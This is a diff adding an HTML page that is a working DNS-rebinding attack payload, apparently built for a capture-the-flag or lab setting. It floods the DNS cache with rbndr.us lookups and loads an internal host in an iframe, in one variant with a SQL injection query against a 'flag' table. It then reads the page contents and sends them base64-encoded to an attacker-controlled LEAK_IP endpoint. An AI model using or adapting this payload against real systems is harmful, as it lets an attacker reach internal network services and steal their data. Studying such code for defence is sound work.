@@ -1,0 +1,79 @@
+<html>
+<head>
+034f1a91ce52b21003b855bd5681cf31c0827f2bfe2b5d74664279b684c7d78a 
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.js"></script>
+</head>
+<body>
+
+<div id='payload'></div>
+
+
+<script>
+
+var PORT = '@@PORT';
+var LEAK_IP = '@@LEAK_IP';
+var REQ_HOST = '@@REQ_HOST';
+
+// Try to fill the DNS cache to speed up the attack
+function hitDNScache() {
+    var site = 'http://n'+Math.floor(Math.random()*10000)+'.rbndr.us';
+    const http = new XMLHttpRequest();
+    http.open("GET", site);
+    http.send();
+    http.onreadystatechange = (e) => {
+       // console.log(e);
+    }
+}
+
+function floodDNS() {
+    for ( var i=0; i <1000; i++ ) {
+        // flood
+        setTimeout(hitDNScache, 100);
+    }
+}
+// Example of GET request with params
+function GET_param_query(x) {
+    // Data to use in query of internal target
+    var data = "UNION ALL SELECT flag,1,1,1,1 FROM flag";
+    iframe = document.createElement('iframe')
+    iframe.src = 'http://'+REQ_HOST+':'+PORT+'/search?query='+ encodeURI(data);
+    document.getElementById('payload').appendChild(iframe);
+    setTimeout(leak, 1000)
+}
+
+// Example of GET request, no params
+function GET_query(x) {
+    iframe = document.createElement('iframe')
+    iframe.src = 'http://'+REQ_HOST+':'+PORT;
+    //iframe.src = 'http://'+REQ_HOST;
+    document.getElementById('payload').appendChild(iframe);
+    setTimeout(leak, 1000)
+}
+
+// Leak the data from iframe to our server
+function leak(x) {
+    var iframes = $("iframe");
+    var $y=iframes.contents().find("html").html()
+    // If we got ourself or an empty response, retry
+    if ( $y.includes('034f1a91ce52b21003b855bd5681cf31c0827f2bfe2b5d74664279b684c7d78a') ||
+            $y == '<head></head><body></body>'
+        )
+    {
+        iframes[0].parentNode.removeChild(iframes[0]); // delete it
+        setTimeout(GET_query, 5000);
+    } else {
+        iframe = document.createElement('iframe')
+        iframe.src = 'http://'+LEAK_IP+':'+PORT+'/leak/'+escape(btoa($y));
+        document.getElementById('payload').appendChild(iframe);
+    }
+}
+floodDNS();
+//setTimeout(GET_param_query, 5000);
+setTimeout(GET_query, 5000);
+</script>
+
+
+<div id='someDiv'>
+</div>
+</body>
+</html>
